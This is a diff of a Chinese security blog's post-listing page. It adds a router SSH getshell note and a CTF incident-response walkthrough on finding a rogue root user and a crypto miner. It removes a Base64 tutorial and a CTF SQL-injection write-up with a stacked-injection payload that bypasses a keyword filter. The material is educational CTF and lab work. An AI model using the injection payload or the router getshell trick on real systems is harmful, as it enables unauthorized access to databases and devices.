@@ -207,6 +207,338 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d386e3624.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d386e3624.html" class="post-title-link" itemprop="url">极路由开启SSH并按照python笔记</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-09-27 13:26:23" itemprop="dateCreated datePublished" datetime="2019-09-27T13:26:23+08:00">2019-09-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:19:48" itemprop="dateModified" datetime="2020-10-14T17:19:48+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/IoT安全/" itemprop="url" rel="index"><span itemprop="name">IoT安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>极路由在现在的版本中并不支持telnet连接，在网上还是找到getshell这个路由器的方法。再此复现，并作笔记。</p>
+<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><ul>
+<li><p>路由器需SDcare</p>
+</li>
+<li><p>安装 <code>定时重拨</code>插件（sid=118284854）</p>
+</li>
+<li><p>安装<code>vsftpd</code>插件（sid=770934750）</p>
+</li>
+</ul>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h4 id="开启ssh"><a href="#开启ssh" class="headerlink" title="开启ssh"></a>开启ssh</h4><ul>
+<li>将以下脚本保存为<code>test.sh</code>,放置在<code>ftp://hiwifi.com/</code>目录下,该目录是SD卡并被挂载在<code>/tmp/storage</code>下,<code>vsftpd</code>插件定义目录也在<code>/tmp/storage</code>即可</li>
+</ul>
+<pre><code class="shell">#!/bin/bash
+
+# 启动SSH并设置自动启动
+sed -i &#39;s/1022/22/g&#39; /etc/config/dropbear 
+/etc/init.d/dropbear enable
+/etc/init.d/dropbear start</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190927/1569562530306.png" alt="img"></p>
+<ul>
+<li>设置定时重拨规则：<code>* * * * * sh /tmp/storage/test.sh</code></li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190927/15695626475301.png" alt="img"></p>
+<ul>
+<li>启动等待一分钟即可直接ssh连接上路由器账号为<code>root</code>,密码为后台密码。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190927/15695627717019.png" alt="img"></p>
+<h4 id="安装python和pip"><a href="#安装python和pip" class="headerlink" title="安装python和pip"></a>安装python和pip</h4><ul>
+<li>设置<code>opkg</code>源,<code>/etc/opkg.conf</code>设置为如下内容，其中第五行，dest usb +SD卡的地址，也就是<code>/tmp/storage/soft</code></li>
+</ul>
+<pre><code class="shell">dest root /
+dest ram /tmp
+lists_dir ext /var/opkg-lists
+option overlay_root /overlay
+
+dest usb /tmp/storage/soft 
+
+arch all 100
+arch ramips_24kec 200
+arch ramips 300
+arch mips 400
+arch unkown 500
+
+
+src/gz barrier_breaker_base http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/base
+src/gz barrier_breaker_luci http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/luci
+src/gz barrier_breaker_management http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/management
+src/gz barrier_breaker_oldpackages http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/oldpackages
+src/gz barrier_breaker_packages http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/packages
+src/gz barrier_breaker_routing http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/routing
+src/gz barrier_breaker_telephony http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/telephony</code></pre>
+<ul>
+<li>安装过程</li>
+</ul>
+<pre><code class="shell">opkg update
+
+wget http://downloads.openwrt.org/barrier_breaker/14.07/ramips/mt7620a/packages/base/libc_0.9.33.2-1_ramips_24kec.ipk
+
+opkg -d usb install libc_0.9.33.2-1_ramips_24kec.ipk
+
+opkg -d usb install libreadline
+opkg  -d usb install python
+opkg -d usb install python-json
+opkg -d usb install python-curl
+opkg -d usb install python-openssl
+</code></pre>
+<ul>
+<li>设置环境变量，也是加上python安装目录</li>
+</ul>
+<pre><code>export PATH=$PATH:/tmp/storage/soft/usr/bin </code></pre><ul>
+<li>安装pip</li>
+</ul>
+<pre><code class="shell">wget --no-check-certificate https://bootstrap.pypa.io/get-pip.py  
+
+python get-pip.py</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d522b80276.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d522b80276.html" class="post-title-link" itemprop="url">强网杯应急响复盘</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-09-23 22:43:54" itemprop="dateCreated datePublished" datetime="2019-09-23T22:43:54+08:00">2019-09-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:20:14" itemprop="dateModified" datetime="2020-10-14T17:20:14+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="事中应急响应"><a href="#事中应急响应" class="headerlink" title="事中应急响应"></a>事中应急响应</h2><p>对应急响应经验不足错误总结如下：</p>
+<p><strong>失误</strong>：</p>
+<ul>
+<li><p>操作频繁，导致shell命令覆盖，无法朔源黑客执行的哪些操作</p>
+</li>
+<li><p>web访问频繁，导致web日志存在大量自身ip地址导致审计困难。</p>
+</li>
+</ul>
+<p><strong>正确操作：</strong></p>
+<ul>
+<li><p>历史命令增加储存为1万条</p>
+<pre><code class="shell">sed -i &#39;s/^HISTSIZE=1000/HISTSIZE=10000/g&#39; /etc/profile</code></pre>
+</li>
+<li><p>给历史命令增加登录的IP地址、执行命令时间等信息</p>
+<p>在/etc/profile的文件尾部添加如下行数配置信息：</p>
+</li>
+</ul>
+<pre><code class="shell">######jiagu history xianshi#########
+USER_IP=`who -u am i 2&gt;/dev/null | awk &#39;{print $NF}&#39; | sed -e &#39;s/[()]//g&#39;`
+if [ &quot;$USER_IP&quot; = &quot;&quot; ]
+then
+USER_IP=`hostname`
+fi
+export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;
+shopt -s histappend
+export PROMPT_COMMAND=&quot;history -a&quot;
+######### jiagu history xianshi ##########</code></pre>
+<p>​    让配置生效</p>
+<pre><code class="sehll">source /etc/profile
+
+生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</code></pre>
+<ul>
+<li>开启<code>tcpdump</code>抓取流量到文件，以便使用<code>wireshark</code>分析</li>
+</ul>
+<h2 id="事中应急响应-1"><a href="#事中应急响应-1" class="headerlink" title="事中应急响应"></a>事中应急响应</h2><h3 id="web日志审计"><a href="#web日志审计" class="headerlink" title="web日志审计"></a>web日志审计</h3><ul>
+<li>从日志可以发现，黑客对网站的后台发起了大量登陆尝试</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190923/15692531384896.png" alt="img"></p>
+<h3 id="系统日志审计"><a href="#系统日志审计" class="headerlink" title="系统日志审计"></a>系统日志审计</h3><ul>
+<li><p>系统登陆日志储存在<code>var/log/auth.log</code>或者<code>var/log/secure</code>上。</p>
+</li>
+<li><p>查看日志成功登陆的IP、用户和时间</p>
+</li>
+</ul>
+<pre><code class="shell">grep &quot;Accepted &quot; auth.log | awk &#39;{print $1,$2,$3,$9,$11}&#39;</code></pre>
+<ul>
+<li>可以看到奇怪的用户名和奇怪的ip。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190923/15692542548454.png" alt="img"></p>
+<ul>
+<li>查看具有root权限的用户</li>
+</ul>
+<pre><code class="shell">awk -F: &#39;$3==0{print $1}&#39; /etc/passwd
+或者
+cat /etc/passwd
+查看uid=0的用户
+</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693222606429.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15692545388895.png" alt="img"></p>
+<ul>
+<li>可以得知存在特权的用户除了root还有mysq1，再查看auth.log日志可以直接看到，该用户是被黑客新添加的，而其登陆ip和第一次登陆时间也可以得知</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15692546752738.png" alt="img"></p>
+<h3 id="系统进程审查"><a href="#系统进程审查" class="headerlink" title="系统进程审查"></a>系统进程审查</h3><ul>
+<li>查看所有进程信息，找到异常的程序名</li>
+</ul>
+<pre><code class="shell">ps aux</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693224572614.png" alt="img"></p>
+<ul>
+<li><p>或者使用findshell直接GUI查看进程信息<br><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693225252668.png" alt="img"></p>
+</li>
+<li><p>找到了一个非常奇怪的进程名</p>
+</li>
+</ul>
+<pre><code class="shell">xmr-stak-cpu</code></pre>
+<ul>
+<li>直接查看定时任务也可以看到该进程被启用的信息</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693239569853.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/1569323988668.png" alt="img"></p>
+<ul>
+<li>可以知挖矿病毒绝对路径<code>/etc/xmr-stak-cpu/bin/xmr-stak-cpu</code>,同时<code>bin/config.txt</code>存储了挖矿病毒的配置信息，可以直接得知挖矿病毒的钱包地址。</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d72df663a9.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1783,415 +2115,6 @@ p.interactive()
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d37b850031.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d37b850031.html" class="post-title-link" itemprop="url">BASE64编码原理学习笔记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-09-08 21:51:09" itemprop="dateCreated datePublished" datetime="2019-09-08T21:51:09+08:00">2019-09-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:21:38" itemprop="dateModified" datetime="2020-10-14T17:21:38+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/编码学习/" itemprop="url" rel="index"><span itemprop="name">编码学习</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>5.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Base64编码原理解析"><a href="#Base64编码原理解析" class="headerlink" title="Base64编码原理解析"></a>Base64编码原理解析</h1><p>Base64编码是基于64个字符A-Z,a-z，0-9，+，/的编码方式，因为2的6次方正好为64，所以就用6bit就可以表示出64个字符</p>
-<h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><p>‘A’ 转变为Base64编码：</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190906/15677508068341.png" alt="img"></p>
-<h2 id="表格流程"><a href="#表格流程" class="headerlink" title="表格流程"></a>表格流程</h2><table>
-<thead>
-<tr>
-<th>字符</th>
-<th>A</th>
-<th></th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>AIISC码</td>
-<td>65</td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>二进制</td>
-<td>01000001</td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>分组</td>
-<td>010000</td>
-<td>01000000</td>
-<td>=</td>
-<td>=</td>
-</tr>
-<tr>
-<td>十进制</td>
-<td>16</td>
-<td>16</td>
-<td>=</td>
-<td>=</td>
-</tr>
-<tr>
-<td>BASE64</td>
-<td>Q</td>
-<td>Q</td>
-<td>=</td>
-<td>=</td>
-</tr>
-</tbody></table>
-<h2 id="BASE64查询表"><a href="#BASE64查询表" class="headerlink" title="BASE64查询表"></a>BASE64查询表</h2><pre><code class="python">[&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
-                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
-                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
-                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;]</code></pre>
-<p>从上方流程可以简单知道BASE64是先转换为AIISC码再转换为二进制进而将8位bit分组为6位bit最后不足补0，如组数不足4组，那么就用等于号（“=”）补充。最后将分组的各组再转换为10进制，按照换回来的数字当做base64编码表的形式进行查表得出结果。例如16就是在上述表中找第17位也就是数组的第16位。</p>
-<h2 id="Python实现BASE64编码"><a href="#Python实现BASE64编码" class="headerlink" title="Python实现BASE64编码"></a>Python实现BASE64编码</h2><pre><code class="python">import re
-base64_table = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
-                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
-                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
-                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;]
-def num_10_to_2(numbers):
-    result=[]
-    tmp=[]
-    return_str=&#39;&#39;
-    for number in numbers:
-        while number/2!=0:
-            result.append(int(number%2))
-            number=int(number/2)    
-        if(len(result)&lt;8):
-            for i in range(0,8-len(result)):
-                result.append(0)
-        number_2=&#39;&#39;
-        for i in range(0,len(result)):    
-            nums=len(result)-i-1
-            number_2=str(result[nums])+number_2
-        tmp.append(number_2)
-        result=[]
-    for i in range(len(tmp)):
-        return_str=return_str+tmp[i][::-1]
-    return return_str
-def num_2_to_10(number):
-    number=str(number)
-    nums=0
-    for i  in number:
-        nums=nums*2+int(i)
-    return nums            
-
-def str_to_aiisc(str_char):
-    tmp=[]
-    for i in str_char:
-         tmp.append(int(ord(i)))    
-    return tmp
-def cut_string(strings,lenth):
-    result =  re.findall(&#39;.{&#39;+str(lenth)+&#39;}&#39;,strings)
-    result.append(strings[(len(result)*lenth):]) #把最后几位加上
-    for i in range(0,6-len(result[len(result)-1])):
-        result[len(result)-1]=result[len(result)-1]+str(&#39;0&#39;)
-    return result
-def main(strings):
-    group_base = cut_string(num_10_to_2(str_to_aiisc(strings)),6)
-    if(group_base[len(group_base)-1])==&#39;000000&#39;:
-        group_base.pop(len(group_base)-1)
-    #print(group_base)
-    for i in group_base:
-        print(base64_table[num_2_to_10(i)], end=&#39;&#39;)
-    #print(4-int((len(group_base)/4)/0.25)%4)    
-    for i in range(4-int((len(group_base)/4)/0.25)%4):
-        print(&quot;=&quot;, end=&#39;&#39;)
-    print(&#39;\n&#39;)    
-if __name__==&#39;__main__&#39;:
-    main(&#39;A&#39;)</code></pre>
-<h2 id="PHP实现BASE64编码"><a href="#PHP实现BASE64编码" class="headerlink" title="PHP实现BASE64编码"></a>PHP实现BASE64编码</h2><pre><code class="php">&lt;?php
-function num_10_to_2($number){
-    $result=[];
-    $tmp=[];
-    $number_2=&#39;&#39;;
-    for($i=0;$i&lt;count($number);$i++){
-        while ($number[$i]/2!=0) {
-        array_push($result,intval($number[$i]%2));
-        $number[$i]=intval($number[$i]/2);
-        }
-        for($j=0;$j&lt;count($result);$j++){
-            $nums = count($result)-$j-1;
-            $number_2 = strval($result[$nums]).$number_2;
-        }
-        ///echo $number_2.&#39;&lt;br&gt;&#39;;
-        array_push($tmp,$number_2);
-        $number_2=&#39;&#39;;
-        $result=[];
-    }
-    //var_dump($tmp);
-    for($j=0;$j&lt;count($tmp);$j++){
-    if(strlen($tmp[$j])&lt;8){
-        for($i=0;$i&lt;8-strlen($tmp[$j]);$i++){
-            $tmp[$j]=$tmp[$j].&#39;0&#39;;
-        }
-        $tmp[$j]=strrev($tmp[$j]);
-        //echo $tmp[$j].&#39;&lt;br&gt;&#39;;
-    }
-    }
-
-```
-return implode($tmp);
-```
-
-}
-function num_2_to_10($number){
-    $number = strval($number);
-    $nums = 0;
-    for($i=0;$i&lt;strlen($number);$i++){
-        $nums = $nums*2+intval(substr($number,$i,1));
-    }
-    return $nums;
-}
-function str_to_aiisc($str_char){
-    $result=[];
-    $str_char = strval($str_char);
-    for($i=0;$i&lt;strlen($str_char);$i++){
-        array_push($result,intval(ord(substr($str_char,$i,1))));
-    }
-    return $result;
-}
-function cut_string($number,$lenth){
-    $number = strval($number);
-    $number =  str_split($number,intval($lenth));
-    for($i=0;$i&lt;count($number);$i++){
-        if(strlen($number[$i])&lt;6){
-            $number[$i]=$number[$i].str_repeat(&#39;0&#39;, 6-strlen($number[$i]));
-        }
-    }
-    return $number;
-}
-function base64Encode($strings){
-    $base64_table = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
-                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
-                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
-                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;];
-    $result=&#39;&#39;;
-    $group_bas64 = cut_string(num_10_to_2(str_to_aiisc($strings)),6);
-    for($i=0;$i&lt;count($group_bas64);$i++){
-        $result=$result.$base64_table[num_2_to_10($group_bas64[$i])];
-    }
-    for($i=0;$i&lt;4-intval((count($group_bas64)/4)/0.25)%4;$i++){
-        $result=$result.&quot;=&quot;;
-    }
-    return $result;
-}
- echo base64Encode(&#39;ABaaa&#39;)
-?&gt;</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d72174f7cb.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d72174f7cb.html" class="post-title-link" itemprop="url">强网杯2019-随便注-复盘总结</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-09-04 23:18:49" itemprop="dateCreated datePublished" datetime="2019-09-04T23:18:49+08:00">2019-09-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:22:40" itemprop="dateModified" datetime="2020-10-14T17:22:40+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当时能力有限没有复盘这道题，现在来复盘一下这道比较简单的注入题。</p>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>题目在输入select关键字时候回直接返回一个正则告诉你过滤了哪些内容。</p>
-<pre><code class="php">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre>
-<p>明显题目过滤了select和点（’ . ‘）这样导致无法直接跨表进行查询。或者说无法使用联合查询之类的。尝试可以知道可以使用堆叠注入。</p>
-<pre><code class="mysql">1&#39;;show tables;#</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute20190904/15676107961704.png" alt="img"></p>
-<p>但是由于过滤了select可以使用<code>concat()</code>将字符合成字符串而字符使用<code>char()</code>将ASCII转换为字符，即可bypass过滤，然后使用预处理执行目标语句。</p>
-<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre><code class="mysql">payload=&quot;0&#39;;set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;&quot;
-exp = &quot;select group_concat(flag) from supersqli.1919810931114514&quot;
-result=&#39;&#39;
-for i in exp:
-    result+=&quot;char(%s),&quot;%(ord(i))
-
-print(payload%(result[:-1]))#result[:-1]除去换行符</code></pre>
-<h2 id="pyload"><a href="#pyload" class="headerlink" title="pyload"></a>pyload</h2><pre><code class="mysql">0&#39;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(102),char(108),char(97),char(103),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(115),char(117),char(112),char(101),char(114),char(115),char(113),char(108),char(105),char(46),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52));PREPARE a FROM @s;EXECUTE a;</code></pre>
